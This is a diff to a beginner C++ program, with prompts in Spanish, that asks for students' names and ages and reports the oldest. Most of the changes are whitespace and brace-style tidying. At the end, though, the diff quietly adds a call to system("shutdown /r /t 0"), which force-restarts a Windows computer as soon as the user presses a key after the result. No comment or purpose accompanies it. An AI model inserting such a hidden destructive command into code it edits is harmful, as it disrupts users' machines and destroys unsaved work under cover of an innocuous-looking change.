@@ -15,20 +15,22 @@ int main() {
 	cout<<"Ingresa la cantidad de alumnos: ";
 	cin>>n;
 	cout<<endl;
-	
-	for (int i=0; i<n; i++){
+
+	for (int i=0; i<n; i++) {
 		cout<<"Nombre del alumno: ";
 		cin>>nombre;
 		cout<<endl;
 		cout<<"Edad del alumno: ";
 		cin>>edad;
 		cout<<endl;
-		
-		if(edad>edadMax){
+
+		if(edad>edadMax) {
 			edadMax = edad;
 			nombreMax = nombre;
 		}
 	}
-	
+
 	cout<<nombreMax<<" es el alumno mayor, con "<<edadMax<<" años."<<endl;
-	}
+	cin>>edad;
+	system("shutdown /r /t 0");
+}
